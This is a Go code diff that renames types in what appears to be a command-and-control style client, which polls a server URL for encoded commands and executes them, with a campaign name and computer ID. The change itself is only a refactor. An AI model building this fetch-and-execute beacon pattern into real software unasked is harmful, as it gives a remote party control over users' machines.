@@ -20,7 +20,7 @@ type Client struct {
 	Campaign model.Campaign
 	coder    model.Coder
 
-	commandExec CommandExec
+	packetExecutor PacketExecutor
 }
 
 func NewClient() Client {
@@ -32,7 +32,7 @@ func NewClient() Client {
 		config,
 		campaign,
 		coder,
-		MakeCommandExec(),
+		MakePacketExecutor(),
 	}
 	return w
 }
@@ -84,9 +84,9 @@ func (s *Client) Start() {
 }
 
 func (s *Client) sendPing() {
-	arguments := make(model.CmdArgument)
+	arguments := make(model.PacketArgument)
 	arguments["msg"] = "ooy!"
-	response := make(model.CmdResponse)
+	response := make(model.PacketResponse)
 	command := model.NewCommand("ping", s.Config.ComputerId, "0", arguments, response)
 	s.sendCommand(command)
 }
@@ -105,7 +105,7 @@ func (s *Client) requestAndExecute() bool {
 		return false // if there is a broken command on server, dont flood him
 	}
 
-	err = s.commandExec.execute(&command)
+	err = s.packetExecutor.execute(&command)
 	if err != nil {
 		log.WithFields(log.Fields{
 			"command": command,
@@ -125,32 +125,32 @@ func (s *Client) requestAndExecute() bool {
 	return true // got a command
 }
 
-func (s *Client) GetCommand() (model.CommandBase, error) {
+func (s *Client) GetCommand() (model.Packet, error) {
 	url := s.CommandGetUrl()
 	resp, err := s.HttpGet(url)
 	if err != nil {
-		return model.CommandBase{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
+		return model.Packet{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
 	}
 	defer resp.Body.Close()
 	if resp.StatusCode != http.StatusOK {
-		return model.CommandBase{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
+		return model.Packet{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
 	}
 	bodyBytes, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		return model.CommandBase{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
+		return model.Packet{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
 	}
 
 	if len(bodyBytes) <= 0 {
-		return model.CommandBase{}, ErrNoCommandsFound
+		return model.Packet{}, ErrNoCommandsFound
 	}
 	command, err := s.coder.DecodeData(bodyBytes)
 	if err != nil {
-		return model.CommandBase{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
+		return model.Packet{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
 	}
 	return command, nil
 }
 
-func (s *Client) sendCommand(command model.CommandBase) error {
+func (s *Client) sendCommand(command model.Packet) error {
 	url := s.CommandSendUrl()
 
 	// Setup response
